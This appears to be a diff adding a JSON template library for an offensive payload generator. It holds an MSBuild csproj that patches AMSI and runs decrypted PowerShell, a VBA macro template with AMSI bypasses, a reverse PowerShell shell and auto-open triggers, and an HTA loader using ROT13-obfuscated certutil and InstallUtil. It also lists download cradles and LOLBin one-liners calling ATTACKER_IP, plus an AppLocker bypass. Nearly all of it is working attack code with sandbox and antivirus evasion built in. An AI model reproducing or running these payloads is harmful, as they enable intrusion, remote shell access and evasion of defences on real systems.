@@ -1,0 +1,468 @@
+{
+  "CSProjBypass": {
+    "description": "MSBuild CSProj file with embedded C# and PowerShell payload",
+    "file_extension": ".csproj",
+    "output_type": "csproj",
+    "template_type": "csproj",
+    "template_content": [
+      "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">",
+      "  <Target Name=\"Bypass\">",
+      "    <FullBypass />",
+      "  </Target>",
+      "",
+      "  <UsingTask TaskName=\"FullBypass\"",
+      "             TaskFactory=\"CodeTaskFactory\"",
+      "             AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\">",
+      "    <Task>",
+      "      <Reference Include=\"System.Management.Automation\" />",
+      "      <Code Type=\"Class\" Language=\"cs\">",
+      "        <![CDATA[",
+      "        using System;",
+      "        using System.Diagnostics;",
+      "        using System.Runtime.InteropServices;",
+      "        using System.IO;",
+      "        using System.Management.Automation;",
+      "        using System.Management.Automation.Runspaces;",
+      "        using System.Security.Cryptography;",
+      "        using Microsoft.Build.Framework;",
+      "        using Microsoft.Build.Utilities;",
+      "",
+      "        public class FullBypass : Task, ITask",
+      "        {",
+      "          [DllImport(\"kernel32.dll\", SetLastError = true)]",
+      "          public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);",
+      "",
+      "          [DllImport(\"kernel32.dll\", SetLastError = true)]",
+      "          public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesRead);",
+      "",
+      "          [DllImport(\"kernel32.dll\", SetLastError = true)]",
+      "          public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int processId);",
+      "",
+      "          [DllImport(\"kernel32.dll\", SetLastError = true)]",
+      "          public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint dwSize, out int lpNumberOfBytesWritten);",
+      "",
+      "          public static int BypassAMSI()",
+      "          {",
+      "            Process[] processes = Process.GetProcessesByName(\"powershell\");",
+      "            if (processes.Length == 0)",
+      "            {",
+      "              Console.WriteLine(\"[-] No PowerShell process found. AMSI bypass not needed for cmd.\");",
+      "              return 0; // Success - no AMSI bypass needed",
+      "            }",
+      "            else",
+      "            {",
+      "              Console.WriteLine(\"[+] Found PowerShell process, proceeding with AMSI bypass.\");",
+      "            }",
+      "",
+      "            foreach (Process proc in processes)",
+      "            {",
+      "              IntPtr hProc = OpenProcess(0x1F0FFF, false, proc.Id);",
+      "              IntPtr baseAddress = IntPtr.Zero;",
+      "              int moduleSize = 0;",
+      "",
+      "              foreach (ProcessModule mod in proc.Modules)",
+      "              {",
+      "                if (mod.ModuleName.ToLower() == \"amsi.dll\")",
+      "                {",
+      "                  baseAddress = mod.BaseAddress;",
+      "                  moduleSize = mod.ModuleMemorySize;",
+      "                  break;",
+      "                }",
+      "              }",
+      "",
+      "              if (baseAddress == IntPtr.Zero) continue;",
+      "",
+      "              byte[] sig = new byte[] {",
+      "                0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x5b, 0x08, 0x49,",
+      "                0x89, 0x6b, 0x10, 0x49, 0x89, 0x73, 0x18, 0x57,",
+      "                0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x70,",
+      "                0x4d, 0x8b, 0xf9, 0x41, 0x8b, 0xf8, 0x48, 0x8b",
+      "              };",
+      "",
+      "              byte[] buffer = new byte[32];",
+      "              IntPtr amsiAddr = IntPtr.Zero;",
+      "              IntPtr read;",
+      "",
+      "              for (int i = 0; i < moduleSize; i++)",
+      "              {",
+      "                ReadProcessMemory(hProc, baseAddress + i, buffer, buffer.Length, out read);",
+      "                bool match = true;",
+      "                for (int j = 0; j < sig.Length; j++)",
+      "                {",
+      "                  if (buffer[j] != sig[j])",
+      "                  {",
+      "                    match = false;",
+      "                    break;",
+      "                  }",
+      "                }",
+      "                if (match)",
+      "                {",
+      "                  amsiAddr = baseAddress + i;",
+      "                  break;",
+      "                }",
+      "              }",
+      "",
+      "              if (amsiAddr == IntPtr.Zero) continue;",
+      "",
+      "              uint oldProtect;",
+      "              VirtualProtectEx(hProc, amsiAddr + 0x1b, 0x1000, 0x40, out oldProtect);",
+      "              byte[] patch = new byte[] { 0x31, 0xFF, 0x90 };",
+      "              int written;",
+      "              WriteProcessMemory(hProc, amsiAddr + 0x1b, patch, (uint)patch.Length, out written);",
+      "            }",
+      "",
+      "            return 0;",
+      "          }",
+      "",
+      "          public static string Decrypt(string b64, string keyB64, string ivB64)",
+      "          {",
+      "            byte[] encrypted = Convert.FromBase64String(b64);",
+      "            byte[] key = Convert.FromBase64String(keyB64);",
+      "            byte[] iv = Convert.FromBase64String(ivB64);",
+      "",
+      "            using (Aes aes = Aes.Create())",
+      "            {",
+      "              aes.Key = key;",
+      "              aes.IV = iv;",
+      "              aes.Mode = CipherMode.CBC;",
+      "              aes.Padding = PaddingMode.PKCS7;",
+      "",
+      "              using (ICryptoTransform decryptor = aes.CreateDecryptor())",
+      "              {",
+      "                byte[] result = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);",
+      "                return System.Text.Encoding.UTF8.GetString(result);",
+      "              }",
+      "            }",
+      "          }",
+      "",
+      "          public override bool Execute()",
+      "          {",
+      "            // Sleep for 10 seconds for sandbox evasion",
+      "            System.Threading.Thread.Sleep(10000);",
+      "",
+      "            BypassAMSI();",
+      "",
+      "            PLACEHOLDER_PING_DELAY",
+      "",
+      "            // Replace with the values from Python",
+      "            string encryptedShellcodeB64 = \"ENCRYPTED_SHELLCODE_B64\";",
+      "            string keyB64 = \"AES_KEY_B64\";",
+      "            string ivB64 = \"AES_IV_B64\";",
+      "",
+      "            string decodedScript = Decrypt(encryptedShellcodeB64, keyB64, ivB64);",
+      "",
+      "            using (Runspace rs = RunspaceFactory.CreateRunspace())",
+      "            {",
+      "              rs.Open();",
+      "              using (PowerShell ps = PowerShell.Create())",
+      "              {",
+      "                ps.Runspace = rs;",
+      "                ps.AddScript(decodedScript);",
+      "                ps.Invoke();",
+      "              }",
+      "              rs.Close();",
+      "            }",
+      "",
+      "            return true;",
+      "          }",
+      "        }",
+      "        ]]>",
+      "      </Code>",
+      "    </Task>",
+      "  </UsingTask>",
+      "</Project>"
+    ],
+    "ping_delay_block": [
+      "            // --- Randomized Ping Delay ---",
+      "            Random rand = new Random();",
+      "            int lastOctet = rand.Next(1, 255);",
+      "            string[] reservedBlocks = { \"192.0.2.\", \"198.51.100.\", \"203.0.113.\" };",
+      "            string baseIP = reservedBlocks[rand.Next(reservedBlocks.Length)];",
+      "            string IP = baseIP + lastOctet;",
+      "            System.Diagnostics.Process p = new System.Diagnostics.Process();",
+      "            p.StartInfo.FileName = \"cmd.exe\";",
+      "            p.StartInfo.Arguments = \"/c ping -n 6 \" + IP + \" >nul\";",
+      "            p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;",
+      "            p.Start();",
+      "            p.WaitForExit();"
+    ]
+  },
+  
+  "VBAMacro": {
+    "description": "VBA Macro payload with AMSI bypass and reverse PowerShell payload",
+    "file_extension": ".txt",
+    "output_type": "macro",
+    "template_structure": {
+      "functions": {
+        "string_decoder": [
+          "Function bears(cows)",
+          "    bears = StrReverse(cows)",
+          "End Function"
+        ],
+        "sleep_function": [
+          "' Universal sleep function that works in all Office applications",
+          "Sub SleepSeconds(seconds As Integer)",
+          "    Dim startTime As Date",
+          "    startTime = Now",
+          "    Do While DateDiff(\"s\", startTime, Now) < seconds",
+          "        DoEvents",
+          "    Loop",
+          "End Sub"
+        ]
+      },
+      "amsi_bypasses": {
+        "primary_bypass": "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
+        "secondary_bypass": "try{$a=Add-Type -M '[DllImport(`kernel32.dll`)]public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport(`kernel32.dll`)]public static extern IntPtr LoadLibrary(string lpFileName);[DllImport(`kernel32.dll`)]public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);' -Name Win32 -PassThru;$b=$a::LoadLibrary(`amsi.dll`);$c=$a::GetProcAddress($b,`AmsiScanBuffer`);$d=0;$a::VirtualProtect($c,5,0x40,[ref]$d);[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3),0,$c,6)}catch{}",
+        "bypass_block_template": [
+          "    Dim {AMSI_VAR1} As String, {AMSI_VAR2} As String",
+          "    {AMSI_VAR1} = \"powershell -nop -w hidden -c \" & _",
+          "           {PRIMARY_CHUNKS}",
+          "    {AMSI_VAR2} = \"powershell -nop -w hidden -c \" & _", 
+          "           {SECONDARY_CHUNKS}",
+          "    CreateObject(\"WScript.Shell\").Run {AMSI_VAR1}, 0, False",
+          "    CreateObject(\"WScript.Shell\").Run {AMSI_VAR2}, 0, False"
+        ]
+      },
+      "powershell_template": "$s=New-Object Net.Sockets.TCPClient('{IP}',{PORT});$stream=$s.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte=[Text.Encoding]::ASCII.GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$s.Close()",
+      "auto_execution_functions": [
+        "AutoOpen",
+        "Document_Open", 
+        "AutoExec",
+        "Workbook_Open",
+        "Auto_Open"
+      ],
+      "main_template": [
+        "Sub {MAIN_FUNC}()",
+        "    ' Connection info: {IP}:{PORT}",
+        "    ' Sleep for sandbox evasion", 
+        "    Call SleepSeconds(3)",
+        "    ",
+        "{AMSI_BYPASS_BLOCK}",
+        "    ",
+        "    ' Brief delay between bypass and payload",
+        "    Call SleepSeconds(1)",
+        "    ",
+        "    Dim {STR_VAR} As String",
+        "    {STR_VAR} = bears({PAYLOAD_CHUNKS})",
+        "    GetObject(bears(\"{WMI_STRING}\")).Get(bears(\"{PROCESS_STRING}\")).Create {STR_VAR}, Null, Null, pid",
+        "End Sub"
+      ],
+      "auto_execution_template": [
+        "Sub {AUTO_FUNC}()",
+        "    {MAIN_FUNC}",
+        "End Sub"
+      ],
+      "complete_macro_template": [
+        "{HELPER_FUNCTIONS}",
+        "",
+        "{MAIN_FUNCTION}",
+        "",
+        "{AUTO_EXECUTION_FUNCTIONS}"
+      ],
+      "obfuscated_strings": {
+        "wmi_string": ":stmgmniw",
+        "process_string": "ssecorP_23niW"
+      }
+    },
+    "obfuscation": {
+      "chunk_size": 100,
+      "line_chunk_size": 90,
+      "variable_name_length": 6,
+      "function_name_length": 8,
+      "auto_func_lengths": [10, 11, 12],
+      "variable_lengths": {
+        "main_func": 8,
+        "amsi_var1": 6,
+        "amsi_var2": 6,
+        "str_var": 7
+      },
+      "fixed_function_name": "bears"
+    }
+  },
+  
+  "HTARunner": {
+    "description": "HTML Application with obfuscated certutil download and InstallUtil execution",
+    "file_extension": ".hta",
+    "output_type": "hta",
+    "template_structure": {
+      "html_wrapper": [
+        "<!DOCTYPE html>",
+        "<html>",
+        "<head>",
+        "<title>HTA</title>",
+        "<meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\" />",
+        "<script language=\"JScript\">",
+        "{JAVASCRIPT_CONTENT}",
+        "</script>",
+        "</head>",
+        "<body>",
+        "<script language=\"JScript\">",
+        "    self.close();",
+        "</script>",
+        "</body>",
+        "</html>"
+      ],
+      "obfuscation_mapping": {
+        "alphabet": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
+        "rot_alphabet": "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
+        "numbers": "0123456789",
+        "symbols": "/$:;-\\\\%#*&!. "
+      },
+      "javascript_template": [
+        "",
+        "    var alph = \"{ALPHABET}\".split(\"\");",
+        "    var ranalph = \"{ROT_ALPHABET}\".split(\"\");",
+        "    var num = \"{NUMBERS}\".split(\"\");",
+        "    var sym = \"{SYMBOLS}\".split(\"\");",
+        "    ",
+        "    // certutil.exe -urlcache -split -f ",
+        "    var sample = \"{CERTUTIL_BASE}\";",
+        "",
+        "    var scram = function(sample) {",
+        "        var result = \"\";",
+        "        for (var x=0; x<sample.length; x++) {",
+        "            for (var y=0; y<alph.length; y++) {",
+        "                if (sample[x]==alph[y]) {",
+        "                    result+=ranalph[y];",
+        "                }",
+        "            }",
+        "            for (var s=0; s<sym.length; s++) {",
+        "                if(sample[x]==sym[s]) {",
+        "                    result+=sym[s];",
+        "                }",
+        "            }",
+        "            for (var n=0; n<num.length; n++) {",
+        "                if(sample[x]==num[n]) {",
+        "                    result+=num[n];",
+        "                }",
+        "            }",
+        "        }",
+        "        return result.toString();",
+        "    };",
+        "    ",
+        "{EXECUTION_STAGES}"
+      ],
+      "execution_stages": [
+        "    // Stage 1 delivery",
+        "    str1 = scram(sample);",
+        "    // Wscript.shell",
+        "    sample = \"{WSCRIPT_SHELL}\";",
+        "    wobj = scram(sample);",
+        "    // Target: {IP}:{PORT}/file.txt C:\\\\Windows\\\\Tasks\\\\file.txt",
+        "    sample = \"{TARGET_PATH}\";",
+        "    str2 = scram(sample);",
+        "    // http://",
+        "    sample = \"{HTTP_PREFIX}\";",
+        "    str3 = scram(sample);",
+        "",
+        "    // Stage 2 setup",
+        "    // certutil -decode C:\\\\Windows\\\\Tasks\\\\file.txt C:\\\\Windows\\\\Tasks\\\\bp.exe",
+        "    sample = \"{DECODE_COMMAND}\";",
+        "    str4 = scram(sample);",
+        "",
+        "    // Stage 3 execution",
+        "    // C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\\\Windows\\\\Tasks\\\\bp.exe",
+        "    sample = \"{INSTALLUTIL_COMMAND}\";",
+        "    str5 = scram(sample);",
+        "",
+        "    var ex = new ActiveXObject(wobj);",
+        "    // %comspec% is an env var for cmd.exe, set t= sets an env variable containing the string http which defender was flagging on",
+        "    cmd = \"%comspec% /v /c \\\"set t=\" + str3 + \"&&\" + str1 + \"!t!\" + str2 + \"\\\"\";",
+        "    cmd2 = str4;",
+        "    cmd3 = str5;",
+        "",
+        "    var deploy = ex.Run(cmd);",
+        "    var deploy = ex.Run(cmd2);",
+        "    var deploy = ex.Run(cmd3);"
+      ],
+      "command_templates": {
+        "certutil_base": " preghgvy.rkr -heypnpur -fcyvg -s ",
+        "target_path": "{IP}:{PORT}/svyr.gkg P:\\\\Jvaqbjf\\\\Gnfxf\\\\svyr.gkg",
+        "http_prefix": "uggc://",
+        "decode_command": "preghgvy -qrpbqr P:\\\\Jvaqbjf\\\\Gnfxf\\\\svyr.gkg P:\\\\Jvaqbjf\\\\Gnfxf\\\\oc.rkr",
+        "installutil_command": "P:\\\\Jvaqbjf\\\\Zvpebfbsg.ARG\\\\Senzrjbex64\\\\i4.0.30319\\\\VafgnyyHgvy.rkr /ybtsvyr= /YbtGbPbafbyr=snyfr /H P:\\\\Jvaqbjf\\\\Gnfxf\\\\oc.rkr",
+        "wscript_shell": "Jfpevcg.furyy"
+      }
+    }
+  },
+  
+  "AppLockerBypass": {
+    "description": "AppLocker bypass techniques and configurations",
+    "file_extension": ".cs",
+    "output_type": "bypass"
+  },
+  
+  "PowerShellCradle": {
+    "description": "PowerShell download cradles and execution methods",
+    "templates": {
+      "certutil_download": [
+        "certutil -urlcache -split -f http://ATTACKER_IP:PORT/payload.exe %TEMP%\\\\update.exe",
+        "%TEMP%\\\\update.exe"
+      ],
+      "bitsadmin_download": [
+        "bitsadmin /transfer update /download /priority high http://ATTACKER_IP:PORT/payload.exe %TEMP%\\\\update.exe",
+        "%TEMP%\\\\update.exe"
+      ],
+      "powershell_downloadstring": [
+        "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/payload.ps1')\""
+      ],
+      "installutil_bypass": [
+        "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319\\\\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\\\\payload.exe"
+      ]
+    }
+  },
+  
+  "LivingOffTheLand": {
+    "description": "Living off the land binaries (LOLBins) for execution",
+    "binaries": {
+      "mshta": {
+        "description": "Execute HTA files",
+        "example": "mshta.exe http://ATTACKER_IP:PORT/payload.hta"
+      },
+      "rundll32": {
+        "description": "Execute DLL functions",
+        "example": "rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:http://ATTACKER_IP:PORT/payload.sct\\\")\\\"\""
+      },
+      "regsvr32": {
+        "description": "Execute scriptlets",
+        "example": "regsvr32.exe /s /n /u /i:http://ATTACKER_IP:PORT/payload.sct scrobj.dll"
+      },
+      "wmic": {
+        "description": "Execute XSL stylesheets",
+        "example": "wmic.exe os get /format:\\\"http://ATTACKER_IP:PORT/payload.xsl\\\"\""
+      }
+    }
+  },
+  
+  "InstallUtilBypass": {
+    "description": "AppLocker bypass using InstallUtil.exe and System.Configuration.Install.Installer",
+    "file_extension": ".cs",
+    "output_type": "applocker_bypass",
+    "class_wrapper": {
+      "directives": [
+        "using System.Configuration.Install;",
+        "using System.Runtime.InteropServices;",
+        "using System;",
+        "using System.Diagnostics;",
+        "using System.Security.Cryptography;",
+        "using System.IO;",
+        "using System.Collections.Generic;"
+      ],
+      "class_definition": [
+        "[System.ComponentModel.RunInstaller(true)]",
+        "public class Sample : Installer",
+        "{"
+      ],
+      "main_override": [
+        "public override void Uninstall(System.Collections.IDictionary savedState)",
+        "{"
+      ],
+      "class_closing": [
+        "}",
+        "",
+        "class Program { static void Main(string[] args) { Console.WriteLine(\"Decoy Main()\"); } }"
+      ],
+      "execution_command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"
+    }
+  }
+}
